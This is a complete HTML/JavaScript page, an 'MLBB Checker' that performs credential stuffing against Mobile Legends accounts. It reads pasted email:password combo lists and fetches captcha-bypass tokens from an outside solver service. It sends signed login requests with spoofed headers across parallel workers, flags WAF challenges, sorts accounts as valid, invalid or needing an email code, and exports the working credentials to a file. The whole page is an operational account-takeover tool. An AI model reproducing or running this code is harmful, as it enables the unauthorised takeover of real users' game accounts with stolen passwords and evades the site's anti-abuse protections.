<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MLBB Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: #0a0a0a;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 15px;
        }
        .container { max-width: 800px; margin: 0 auto; }
        h1 {
            text-align: center;
            font-size: 2em;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #00d4ff, #a855f7, #ff007f);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle { text-align: center; color: #888; margin-bottom: 20px; font-size: 0.9em; }
        .card {
            background: #111; border: 1px solid #222; border-radius: 10px;
            padding: 15px; margin-bottom: 15px;
        }
        .card h3 { margin-bottom: 10px; color: #00d4ff; font-size: 1em; }
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .stat {
            text-align: center; padding: 10px; background: #0a0a0a; border-radius: 8px;
        }
        .stat .label { font-size: 0.75em; color: #888; }
        .stat .value { font-size: 1.8em; font-weight: bold; font-family: monospace; }
        .stat .value.valid { color: #00ff41; }
        .stat .value.invalid { color: #ff0044; }
        .stat .value.v2l { color: #ffe600; }
        .stat .value.total { color: #00d4ff; }
        
        textarea {
            width: 100%; height: 150px; background: #0a0a0a; border: 1px solid #222;
            border-radius: 8px; padding: 10px; color: #e0e0e0; font-family: monospace;
            font-size: 0.85em; resize: vertical;
        }
        textarea:focus { border-color: #00d4ff; outline: none; }
        
        .controls { display: flex; gap: 10px; margin-top: 10px; }
        input[type="number"] {
            width: 80px; background: #0a0a0a; border: 1px solid #222;
            border-radius: 8px; padding: 8px; color: #e0e0e0; text-align: center;
        }
        button {
            flex: 1; padding: 10px; border: none; border-radius: 8px;
            font-weight: bold; cursor: pointer; font-size: 0.9em;
        }
        .btn-start { background: linear-gradient(135deg, #00ff41, #00d4ff); color: #000; }
        .btn-stop { background: linear-gradient(135deg, #ff0044, #ff6600); color: #fff; }
        .btn-start:disabled, .btn-stop:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .log-container {
            background: #0a0a0a; border: 1px solid #222; border-radius: 8px;
            padding: 10px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 0.8em;
        }
        .log-entry { padding: 3px 0; border-bottom: 1px solid #111; }
        .log-entry.valid { color: #00ff41; }
        .log-entry.invalid { color: #ff0044; }
        .log-entry.v2l { color: #ffe600; }
        .log-entry.error { color: #ff6600; }
        
        .progress {
            height: 6px; background: #0a0a0a; border-radius: 3px; overflow: hidden; margin-bottom: 10px;
        }
        .progress-bar {
            height: 100%; background: linear-gradient(90deg, #00d4ff, #a855f7);
            width: 0%; transition: width 0.3s;
        }
        
        .server-status {
            display: flex; align-items: center; gap: 8px;
            padding: 8px 12px; background: #0a0a0a; border-radius: 8px;
            margin-bottom: 15px; font-size: 0.85em;
        }
        .server-dot {
            width: 10px; height: 10px; border-radius: 50%;
            background: #ff0044; animation: pulse 2s infinite;
        }
        .server-dot.online { background: #00ff41; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        
        .export-btns { display: flex; gap: 10px; margin-top: 10px; }
        .export-btns button { font-size: 0.8em; padding: 8px; }
        .btn-export-valid { background: #00ff41; color: #000; }
        .btn-export-all { background: #333; color: #fff; }
        
        .error-box {
            background: #1a0a0a; border: 1px solid #ff0044; border-radius: 8px;
            padding: 10px; margin-bottom: 15px; font-size: 0.85em; display: none;
        }
        .error-box.show { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <h1>MLBB Checker</h1>
        <p class="subtitle">Browser-based Account Checker</p>
        
        <div class="server-status">
            <div class="server-dot" id="serverDot"></div>
            <span id="serverText">Checking CN31 solver...</span>
        </div>
        
        <div class="error-box" id="errorBox"></div>
        
        <div class="card">
            <h3>Live Stats</h3>
            <div class="grid">
                <div class="stat"><div class="label">VALID</div><div class="value valid" id="statValid">0</div></div>
                <div class="stat"><div class="label">INVALID</div><div class="value invalid" id="statInvalid">0</div></div>
                <div class="stat"><div class="label">V2L</div><div class="value v2l" id="statV2l">0</div></div>
                <div class="stat"><div class="label">CHECKED</div><div class="value total" id="statChecked">0</div></div>
            </div>
            <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
        </div>
        
        <div class="card">
            <h3>Combo List</h3>
            <textarea id="comboList" placeholder="email:password&#10;email:password&#10;..."></textarea>
            <div class="controls">
                <input type="number" id="threadCount" value="5" min="1" max="20" placeholder="Threads">
                <button class="btn-start" id="btnStart" onclick="startCheck()">START</button>
                <button class="btn-stop" id="btnStop" onclick="stopCheck()" disabled>STOP</button>
            </div>
        </div>
        
        <div class="card">
            <h3>Results Log</h3>
            <div class="log-container" id="logContainer"><div class="log-entry">Ready...</div></div>
            <div class="export-btns">
                <button class="btn-export-valid" onclick="exportValid()">Export Valid</button>
                <button class="btn-export-all" onclick="exportAll()">Export All</button>
            </div>
        </div>
    </div>
    
    <script>
        const CN31_SERVER = 'https://cn31-solver-production.up.railway.app/api/get-token';
        const LOGIN_URL = 'https://accountmtapi.mobilelegends.com';
        
        let stats = { valid: 0, invalid: 0, v2l: 0, checked: 0 };
        let isRunning = false;
        let shouldStop = false;
        let validAccounts = [];
        let allResults = [];
        let totalAccounts = 0;
        let captchaFailCount = 0;
        
        function md5(string) {
            function rotateLeft(val, shift) { return (val << shift) | (val >>> (32 - shift)); }
            function addUnsigned(x, y) { return (x + y) & 0xffffffff; }
            function F(x, y, z) { return (x & y) | (~x & z); }
            function G(x, y, z) { return (x & z) | (y & ~z); }
            function H(x, y, z) { return x ^ y ^ z; }
            function I(x, y, z) { return y ^ (x | ~z); }
            function transform(func, a, b, c, d, x, s, ac) {
                let res = addUnsigned(a, addUnsigned(addUnsigned(func(b, c, d), x), ac));
                return addUnsigned(rotateLeft(res, s), b);
            }
            function convertToWordArray(str) {
                let len = str.length;
                let numWords = ((len + 8) >>> 6) + 1;
                let words = Array(numWords * 16).fill(0);
                for (let i = 0; i < len; i++) words[i >>> 2] |= str.charCodeAt(i) << ((i % 4) * 8);
                words[len >>> 2] |= 0x80 << ((len % 4) * 8);
                words[(numWords * 16) - 2] = len * 8;
                return words;
            }
            function wordToHex(val) {
                let hex = '';
                for (let i = 0; i <= 3; i++) hex += ((val >>> (i * 8)) & 255).toString(16).padStart(2, '0');
                return hex;
            }
            
            let x = convertToWordArray(string);
            let S11=7,S12=12,S13=17,S14=22,S21=5,S22=9,S23=14,S24=20,S31=4,S32=11,S33=16,S34=23,S41=6,S42=10,S43=15,S44=21;
            let a=0x67452301,b=0xefcdab89,c=0x98badcfe,d=0x10325476;
            
            for(let k=0;k<x.length;k+=16){
                let AA=a,BB=b,CC=c,DD=d;
                a=transform(F,a,b,c,d,x[k+0],S11,0xd76aa478);d=transform(F,d,a,b,c,x[k+1],S12,0xe8c7b756);
                c=transform(F,c,d,a,b,x[k+2],S13,0x242070db);b=transform(F,b,c,d,a,x[k+3],S14,0xc1bdceee);
                a=transform(F,a,b,c,d,x[k+4],S11,0xf57c0faf);d=transform(F,d,a,b,c,x[k+5],S12,0x4787c62a);
                c=transform(F,c,d,a,b,x[k+6],S13,0xa8304613);b=transform(F,b,c,d,a,x[k+7],S14,0xfd469501);
                a=transform(F,a,b,c,d,x[k+8],S11,0x698098d8);d=transform(F,d,a,b,c,x[k+9],S12,0x8b44f7af);
                c=transform(F,c,d,a,b,x[k+10],S13,0xffff5bb1);b=transform(F,b,c,d,a,x[k+11],S14,0x895cd7be);
                a=transform(F,a,b,c,d,x[k+12],S11,0x6b901122);d=transform(F,d,a,b,c,x[k+13],S12,0xfd987193);
                c=transform(F,c,d,a,b,x[k+14],S13,0xa679438e);b=transform(F,b,c,d,a,x[k+15],S14,0x49b40821);
                a=transform(G,a,b,c,d,x[k+1],S21,0xf61e2562);d=transform(G,d,a,b,c,x[k+6],S22,0xc040b340);
                c=transform(G,c,d,a,b,x[k+11],S23,0x265e5a51);b=transform(G,b,c,d,a,x[k+0],S24,0xe9b6c7aa);
                a=transform(G,a,b,c,d,x[k+5],S21,0xd62f105d);d=transform(G,d,a,b,c,x[k+10],S22,0x2441453);
                c=transform(G,c,d,a,b,x[k+15],S23,0xd8a1e681);b=transform(G,b,c,d,a,x[k+4],S24,0xe7d3fbc8);
                a=transform(G,a,b,c,d,x[k+9],S21,0x21e1cde6);d=transform(G,d,a,b,c,x[k+14],S22,0xc33707d6);
                c=transform(G,c,d,a,b,x[k+3],S23,0xf4d50d87);b=transform(G,b,c,d,a,x[k+8],S24,0x455a14ed);
                a=transform(G,a,b,c,d,x[k+13],S21,0xa9e3e905);d=transform(G,d,a,b,c,x[k+2],S22,0xfcefa3f8);
                c=transform(G,c,d,a,b,x[k+7],S23,0x676f02d9);b=transform(G,b,c,d,a,x[k+12],S24,0x8d2a4c8a);
                a=transform(H,a,b,c,d,x[k+5],S31,0xfffa3942);d=transform(H,d,a,b,c,x[k+8],S32,0x8771f681);
                c=transform(H,c,d,a,b,x[k+11],S33,0x6d9d6122);b=transform(H,b,c,d,a,x[k+14],S34,0xfde5380c);
                a=transform(H,a,b,c,d,x[k+1],S31,0xa4beea44);d=transform(H,d,a,b,c,x[k+4],S32,0x4bdecfa9);
                c=transform(H,c,d,a,b,x[k+7],S33,0xf6bb4b60);b=transform(H,b,c,d,a,x[k+10],S34,0xbebfbc70);
                a=transform(H,a,b,c,d,x[k+13],S31,0x289b7ec6);d=transform(H,d,a,b,c,x[k+0],S32,0xeaa127fa);
                c=transform(H,c,d,a,b,x[k+3],S33,0xd4ef3085);b=transform(H,b,c,d,a,x[k+6],S34,0x4881d05);
                a=transform(H,a,b,c,d,x[k+9],S31,0xd9d4d039);d=transform(H,d,a,b,c,x[k+12],S32,0xe6db99e5);
                c=transform(H,c,d,a,b,x[k+15],S33,0x1fa27cf8);b=transform(H,b,c,d,a,x[k+2],S34,0xc4ac5665);
                a=transform(I,a,b,c,d,x[k+0],S41,0xf4292244);d=transform(I,d,a,b,c,x[k+7],S42,0x432aff97);
                c=transform(I,c,d,a,b,x[k+14],S43,0xab9423a7);b=transform(I,b,c,d,a,x[k+5],S44,0xfc93a039);
                a=transform(I,a,b,c,d,x[k+12],S41,0x655b59c3);d=transform(I,d,a,b,c,x[k+3],S42,0x8f0ccc92);
                c=transform(I,c,d,a,b,x[k+10],S43,0xffeff47d);b=transform(I,b,c,d,a,x[k+1],S44,0x85845dd1);
                a=transform(I,a,b,c,d,x[k+8],S41,0x6fa87e4f);d=transform(I,d,a,b,c,x[k+15],S42,0xfe2ce6e0);
                c=transform(I,c,d,a,b,x[k+6],S43,0xa3014314);b=transform(I,b,c,d,a,x[k+13],S44,0x4e0811a1);
                a=transform(I,a,b,c,d,x[k+4],S41,0xf7537e82);d=transform(I,d,a,b,c,x[k+11],S42,0xbd3af235);
                c=transform(I,c,d,a,b,x[k+2],S43,0x2ad7d2bb);b=transform(I,b,c,d,a,x[k+9],S44,0xeb86d391);
                a=addUnsigned(a,AA);b=addUnsigned(b,BB);c=addUnsigned(c,CC);d=addUnsigned(d,DD);
            }
            return (wordToHex(a)+wordToHex(b)+wordToHex(c)+wordToHex(d));
        }
        
        function showError(msg) {
            const box = document.getElementById('errorBox');
            box.textContent = msg;
            box.classList.add('show');
        }
        
        function hideError() {
            document.getElementById('errorBox').classList.remove('show');
        }
        
        async function fetchCaptchaToken() {
            try {
                const resp = await fetch(CN31_SERVER);
                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
                const data = await resp.json();
                if (!data.token) throw new Error('No token in response');
                return data.token;
            } catch (e) {
                throw new Error(`Failed to fetch token: ${e.message}`);
            }
        }
        
        function updateServerStatus(online) {
            const dot = document.getElementById('serverDot');
            const text = document.getElementById('serverText');
            dot.className = 'server-dot' + (online ? ' online' : '');
            text.textContent = online ? 'CN31 Solver Online' : 'CN31 Solver Offline';
        }
        
        function updateStats() {
            document.getElementById('statValid').textContent = stats.valid;
            document.getElementById('statInvalid').textContent = stats.invalid;
            document.getElementById('statV2l').textContent = stats.v2l;
            document.getElementById('statChecked').textContent = stats.checked;
            if (totalAccounts > 0) {
                document.getElementById('progressBar').style.width = (stats.checked / totalAccounts * 100) + '%';
            }
        }
        
        function addLog(msg, type = 'info') {
            const container = document.getElementById('logContainer');
            const entry = document.createElement('div');
            entry.className = 'log-entry ' + type;
            entry.textContent = msg;
            container.insertBefore(entry, container.firstChild);
            while (container.children.length > 100) container.removeChild(container.lastChild);
        }
        
        async function checkAccount(email, password) {
            let token;
            try {
                token = await fetchCaptchaToken();
            } catch (e) {
                return { status: 'error', msg: e.message };
            }
            
            const params = {
                account: email, md5pwd: md5(password), game_token: '',
                recaptcha_token: '', e_captcha: token, country: ''
            };
            const sortedItems = Object.entries(params).sort((a, b) => a[0].localeCompare(b[0]));
            let signString = sortedItems.map(([k, v]) => `${k}=${v}`).join('&');
            signString += '&op=new_login_pwd';
            const sign = md5(signString);
            const payload = { op: 'new_login_pwd', sign: sign, params: params, lang: 'en' };
            
            try {
                const resp = await fetch(LOGIN_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Origin': 'https://mtacc.mobilelegends.com',
                        'Referer': 'https://mtacc.mobilelegends.com/',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    body: JSON.stringify(payload),
                    credentials: 'include'
                });
                
                const text = await resp.text();
                if (text.includes('aliyun_waf') || text.includes('renderData')) {
                    return { status: 'error', msg: 'WAF challenge detected' };
                }
                try {
                    return { status: 'success', code: resp.status, json: JSON.parse(text) };
                } catch {
                    return { status: 'error', msg: `Invalid JSON: ${text.substring(0, 100)}` };
                }
            } catch (e) {
                return { status: 'error', msg: e.message };
            }
        }
        
        async function processAccount(account) {
            if (shouldStop) return;
            const parts = account.split(':');
            if (parts.length < 2) return;
            
            const email = parts[0].trim();
            const password = parts[1].trim();
            
            const result = await checkAccount(email, password);
            stats.checked++;
            
            if (result.status === 'error') {
                addLog(`ERROR ${email} - ${result.msg}`, 'error');
                if (result.msg && result.msg.includes('token')) {
                    showError('Token fetch failed. CN31 server may be down or blocking requests.');
                }
                allResults.push({ email, password, status: 'error', msg: result.msg });
            } else if (result.json && result.json.code === 0) {
                stats.valid++;
                validAccounts.push({ email, password });
                addLog(`✓ VALID ${email}`, 'valid');
                allResults.push({ email, password, status: 'valid' });
            } else if (result.json) {
                const msg = result.json.message || '';
                if (msg.includes('PasswdError') || msg.includes('UserNotExist')) {
                    stats.invalid++;
                    addLog(`✗ INVALID ${email}`, 'invalid');
                    allResults.push({ email, password, status: 'invalid' });
                } else if (msg.includes('NeedEmailCode')) {
                    stats.v2l++;
                    addLog(`⚠ V2L ${email}`, 'v2l');
                    allResults.push({ email, password, status: 'v2l' });
                } else if (msg.includes('ECaptcha_VerifyFail')) {
                    captchaFailCount++;
                    addLog(`CAPTCHA_FAIL ${email} (total: ${captchaFailCount})`, 'error');
                    // Retry once
                    if (captchaFailCount <= 5) return processAccount(account);
                    allResults.push({ email, password, status: 'error', msg: 'captcha_failed' });
                } else {
                    addLog(`ERROR ${email} - ${msg}`, 'error');
                    allResults.push({ email, password, status: 'error', msg: msg });
                }
            }
            updateStats();
        }
        
        async function startCheck() {
            const comboText = document.getElementById('comboList').value.trim();
            if (!comboText) { alert('Please enter combo list'); return; }
            
            const accounts = comboText.split('\n').filter(line => line.includes(':'));
            if (accounts.length === 0) { alert('No valid accounts found'); return; }
            
            const threads = parseInt(document.getElementById('threadCount').value) || 5;
            
            stats = { valid: 0, invalid: 0, v2l: 0, checked: 0 };
            validAccounts = [];
            allResults = [];
            totalAccounts = accounts.length;
            shouldStop = false;
            isRunning = true;
            captchaFailCount = 0;
            hideError();
            
            document.getElementById('btnStart').disabled = true;
            document.getElementById('btnStop').disabled = false;
            document.getElementById('logContainer').innerHTML = '';
            
            addLog(`Starting check with ${accounts.length} accounts, ${threads} threads...`);
            updateStats();
            
            let index = 0;
            const workers = [];
            for (let i = 0; i < Math.min(threads, accounts.length); i++) {
                workers.push((async () => {
                    while (index < accounts.length && !shouldStop) {
                        const idx = index++;
                        await processAccount(accounts[idx]);
                    }
                })());
            }
            await Promise.all(workers);
            
            isRunning = false;
            document.getElementById('btnStart').disabled = false;
            document.getElementById('btnStop').disabled = true;
            addLog(`Check complete! Valid: ${stats.valid}, Invalid: ${stats.invalid}, V2L: ${stats.v2l}`);
        }
        
        function stopCheck() {
            shouldStop = true;
            addLog('Stopping...');
        }
        
        function exportValid() {
            if (validAccounts.length === 0) { alert('No valid accounts'); return; }
            downloadText(validAccounts.map(a => `${a.email}:${a.password}`).join('\n'), 'valid.txt');
        }
        
        function exportAll() {
            if (allResults.length === 0) { alert('No results'); return; }
            downloadText(allResults.map(r => `${r.email}:${r.password}|${r.status}`).join('\n'), 'all_results.txt');
        }
        
        function downloadText(text, filename) {
            const blob = new Blob([text], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = filename; a.click();
            URL.revokeObjectURL(url);
        }
        
        // Check CN31 solver on load
        fetchCaptchaToken().then(token => {
            updateServerStatus(!!token);
            if (token) addLog(`CN31 solver connected. Token: ${token.substring(0, 30)}...`, 'valid');
        }).catch(e => {
            updateServerStatus(false);
            showError(`CN31 solver error: ${e.message}`);
        });
    </script>
</body>
</html>
